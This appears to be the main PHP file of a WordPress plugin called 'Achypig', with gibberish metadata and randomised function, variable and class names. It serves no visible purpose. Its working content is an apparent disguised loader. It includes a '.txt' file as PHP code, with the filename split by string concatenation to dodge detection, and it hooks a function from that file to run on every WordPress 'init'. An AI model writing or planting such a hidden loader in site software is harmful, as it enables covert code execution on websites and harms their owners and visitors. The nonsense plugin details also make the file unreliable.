<?php

/**
 * Plugin Name: Achypig
 * Plugin URI: https://vessur.com/achypig
 * Description: Normandie. There tests, depending on
 * Version: 1.12.2
 * Author: Jules Clark
 * Author URI: https://vessur.com
 * Text Domain: achypig
 * License: GPL2+
 *
 */

function agysok_getuhujach() {
    detaku_vashazhew();
}

$apuluw = __DIR__ . '/gugumu.txt';
if (file_exists($apuluw)) {
    include_once __DIR__ . "/gugu" . "mu.tx" . "t";
}


if (function_exists("detaku_vashazhew")) {
    $rykija = new dujola_zyvuxiged();
    if ($rykija->quhufu_qozythyc()) {
        add_action('init', 'agysok_getuhujach');
    }
}